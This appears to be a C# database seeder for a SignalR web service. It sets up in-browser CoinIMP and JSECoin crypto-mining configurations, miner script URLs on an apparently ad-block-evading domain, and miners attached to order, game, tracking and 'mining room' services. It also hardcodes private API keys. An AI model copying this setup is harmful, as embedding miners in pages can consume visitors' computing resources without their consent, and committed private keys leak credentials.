﻿using SignalRService.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace SignalRService.Utils
{
    public class DbSeeder
    {

        private DAL.ServiceContext db;

        public DbSeeder()
        {
            db = new DAL.ServiceContext();
        }

        public void DefaultMinerConfiguration()
        {
            if (!db.CoinIMPMinerConfiurationModels.Any())
            {
                db.CoinIMPMinerConfiurationModels.Add(new CoinIMPMinerConfigurationModel()
                {
                    ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
                    Throttle = 0.9f,
                    ScriptUrl = "https://www.freecontent.date./W7KS.js",
                    StartDelayMs = 5000,
                    ReportStatusIntervalMs = 60000
                });
                db.SaveChanges();
            }

            if(!db.JSECoinMinerConfigurationModels.Any())
            {
                db.JSECoinMinerConfigurationModels.Add(new JSECoinMinerConfigurationModel()
                {
                     ClientId = "87722",
                     SiteId = "srs.hepf.com",
                     SubId = "0"
                });
                db.SaveChanges();
            }
        }

        public void GeneralSettings()
        {
            IList<GeneralSettingsModel> defaultStandards = new List<GeneralSettingsModel>();
            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductNameMinLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductNameMinLength, Type = Enums.EnumSettingType.Int, Value = "3" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductNameMaxLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductNameMaxLength, Type = Enums.EnumSettingType.Int, Value = "90" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductMinPrice))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductMinPrice, Type = Enums.EnumSettingType.Int, Value = "0" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductMaxPrice))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductMaxPrice, Type = Enums.EnumSettingType.Float, Value = "99999.99" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductPartNumberMinLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductPartNumberMinLength, Type = Enums.EnumSettingType.Int, Value = "3" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductNameMaxLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductPartNumberMaxLength, Type = Enums.EnumSettingType.Int, Value = "12" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductDescriptionMinLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductDescriptionMinLength, Type = Enums.EnumSettingType.Int, Value = "3" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductDescriptionMaxLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductDescriptionMaxLength, Type = Enums.EnumSettingType.Int, Value = "128" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.CoinImpPrivateKey))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.CoinImpPrivateKey, Type = Enums.EnumSettingType.String, Value = "e68733484e6db9e70ed434b38859f2f089e79aa5ae15c9ab8c9fac0c17ecf6fb" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.CoinImpPublicKey))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.CoinImpPublicKey, Type = Enums.EnumSettingType.String, Value = "dba4730c53a1fb01f4fa19ef3e5658623d5369b949809e01853e6eb3653db303" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.CoinImpApiBaseUrl))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.CoinImpApiBaseUrl, Type = Enums.EnumSettingType.String, Value = "https://www.coinimp.com/api/v1/" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.CoinImpApiCallTresholdSec))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.CoinImpApiCallTresholdSec, Type = Enums.EnumSettingType.Int, Value = "60" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.CoinImpXMRPayoutPer1MHashes))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.CoinImpXMRPayoutPer1MHashes, Type = Enums.EnumSettingType.Decimal, Value = "0.00009467" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.MiningRoomNameMaxLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.MiningRoomNameMaxLength, Type = Enums.EnumSettingType.Int, Value = "30" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.MiningRoomNameMinLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.MiningRoomNameMinLength, Type = Enums.EnumSettingType.Int, Value = "3" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.LoadXMRPriceIntervalMs))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.LoadXMRPriceIntervalMs, Type = Enums.EnumSettingType.Int, Value = "54000" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.CoinImpClientIdMinLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.CoinImpClientIdMinLength, Type = Enums.EnumSettingType.Int, Value = "12" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.CoinImpClientIdMaxLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.CoinImpClientIdMaxLength, Type = Enums.EnumSettingType.Int, Value = "128" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ScriptDonaterConnCntValue))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ScriptDonaterConnCntValue, Type = Enums.EnumSettingType.Int, Value = "10" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ScriptDonaterClientId))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ScriptDonaterClientId, Type = Enums.EnumSettingType.String, Value = "b4bbf2bcd9c41c890e7d4cced2962ead7dc9b898434299ae6e3251c222bd81b4" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.JSECoinApiUrl ))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.JSECoinApiUrl, Type = Enums.EnumSettingType.String, Value = "https://api.jsecoin.com" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.JSECoinPrivateKey))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.JSECoinPrivateKey, Type = Enums.EnumSettingType.String, Value = "mOHU7vnNDBpoyDLhFcebrPP9EWo7pjBX" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.JSECoinPublicKey))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.JSECoinPublicKey, Type = Enums.EnumSettingType.String, Value = "040509916867e1b6c767205a7b91508a1d9939b9efe63eb8e5d58f1936ac1cd2204189f50e5c80f98caa97ac9695242fa6745bf9dbc979caecc22364cdf953524e" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.JSEAPITresholdSec))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.JSEAPITresholdSec, Type = Enums.EnumSettingType.Int, Value = "60" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.JSECoinClientIdMinLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.JSECoinClientIdMinLength, Type = Enums.EnumSettingType.Int, Value = "3" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.JSECoinClientIdMaxLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.JSECoinClientIdMaxLength, Type = Enums.EnumSettingType.Int, Value = "12" });


            db.GeneralSettings.AddRange(defaultStandards);
            db.SaveChanges();
        }

        public void TestServices()
        {
            var defAccountProp = new Models.UserDataModel() { IdentityName = "anonymous" };
            db.UserData.Add(defAccountProp);

            var mc = db.CoinIMPMinerConfiurationModels.FirstOrDefault();

            var orderService = new Models.ServiceSettingModel()
            {
                Owner = defAccountProp,
                ServiceName = "TestService",
                ServiceUrl = "testurl",
                ServiceType = Enums.EnumServiceType.OrderService,
                CoinIMPMinerConfiguration = new CoinIMPMinerConfigurationModel() {
                     ClientId = mc.ClientId,
                     ReportStatusIntervalMs = mc.ReportStatusIntervalMs,
                     ScriptUrl = mc.ScriptUrl,
                     StartDelayMs = mc.StartDelayMs,
                     Throttle = mc.Throttle
                }

            };
            db.ServiceSettings.Add(orderService);

            var gameService = new Models.ServiceSettingModel()
            {
                Owner = defAccountProp,
                ServiceName = "TestGame",
                ServiceUrl = "testgame",
                ServiceType = Enums.EnumServiceType.LuckyGameDefault,
                CoinIMPMinerConfiguration = new CoinIMPMinerConfigurationModel()
                {
                    ClientId = mc.ClientId,
                    ReportStatusIntervalMs = 10000,
                    ScriptUrl = mc.ScriptUrl,
                    StartDelayMs = 500,
                    Throttle = mc.Throttle
                }
            };
            db.ServiceSettings.Add(gameService);

            var defRule1 = new Models.LuckyGameWinningRule() { AmountMatchingCards = 3, WinFactor = 1.6f };
            var defRule2 = new Models.LuckyGameWinningRule() { AmountMatchingCards = 4, WinFactor = 4 };
            var defRule3 = new Models.LuckyGameWinningRule() { AmountMatchingCards = 5, WinFactor = 5 };
            var defRule4 = new Models.LuckyGameWinningRule() { AmountMatchingCards = 6, WinFactor = 10 };

            var gsmodel = new Models.LuckyGameSettingsModel()
            {
                MoneyAvailable = 0,
                WinningRules = new List<Models.LuckyGameWinningRule>()

            };
            //   gsmodel.WinningRules.Add(defRule0);
            gsmodel.WinningRules.Add(defRule1);
            gsmodel.WinningRules.Add(defRule2);
            gsmodel.WinningRules.Add(defRule3);
            gsmodel.WinningRules.Add(defRule4);

            gameService.LuckyGameSettings = new List<Models.LuckyGameSettingsModel>();
            gameService.LuckyGameSettings.Add(gsmodel);

            ///
            var trackerService = new ServiceSettingModel() { };
            trackerService.Owner = defAccountProp;
            trackerService.ServiceName = "testTracker";
            trackerService.ServiceUrl = "testtracker";
            trackerService.ServiceType = Enums.EnumServiceType.BaseTracking;
            trackerService.CoinIMPMinerConfiguration = new CoinIMPMinerConfigurationModel()
            {
                ClientId = mc.ClientId,
                ReportStatusIntervalMs = mc.ReportStatusIntervalMs,
                ScriptUrl = mc.ScriptUrl,
                StartDelayMs = mc.StartDelayMs,
                Throttle = mc.Throttle
            };
            db.ServiceSettings.Add(trackerService);

            ///
            var miningRoom0Service = new ServiceSettingModel() { };
            miningRoom0Service.Owner = defAccountProp;
            miningRoom0Service.ServiceName = "testMiningRoom0";
            miningRoom0Service.ServiceUrl = "testminingroom0";
            miningRoom0Service.ServiceType = Enums.EnumServiceType.CrowdMinerCoinIMP;
            miningRoom0Service.CoinIMPMinerConfiguration = new CoinIMPMinerConfigurationModel()
            {
                ClientId = "33dd55318abfb839996ecf61c962bac94d4d7caba66debb0ea2aa3f61668e2b8",
                ReportStatusIntervalMs = mc.ReportStatusIntervalMs,
                ScriptUrl = "https://www.freecontent.date./tGu1.js",
                StartDelayMs = 500,
                Throttle = 0.5f
            };

            db.ServiceSettings.Add(miningRoom0Service);
            db.MiningRooms.Add(new MiningRoomModel() { Name = "room0", Description = "***test***", ServiceSetting = miningRoom0Service });


            var miningRoom1 = new ServiceSettingModel() { };
            miningRoom1.Owner = defAccountProp;
            miningRoom1.ServiceName = "testMiningRoom1";
            miningRoom1.ServiceUrl = "testminingroom1";
            miningRoom1.ServiceType = Enums.EnumServiceType.CrowdMinerCoinIMP;
            miningRoom1.CoinIMPMinerConfiguration = new CoinIMPMinerConfigurationModel()
            {
                ClientId = "13f8168cb06d16abec48cf0b0cdf9e0027948b1c95913be3469d7592a672cd3d",
                ReportStatusIntervalMs = mc.ReportStatusIntervalMs,
                ScriptUrl = "https://www.freecontent.date./tGu1.js",
                StartDelayMs = mc.StartDelayMs,
                Throttle = 0.7f
            };

            db.ServiceSettings.Add(miningRoom1);
            db.MiningRooms.Add(new MiningRoomModel() { Name = "room1", Description = "***test*** test", ServiceSetting = miningRoom1 });

            db.SaveChanges();

        }


    }
}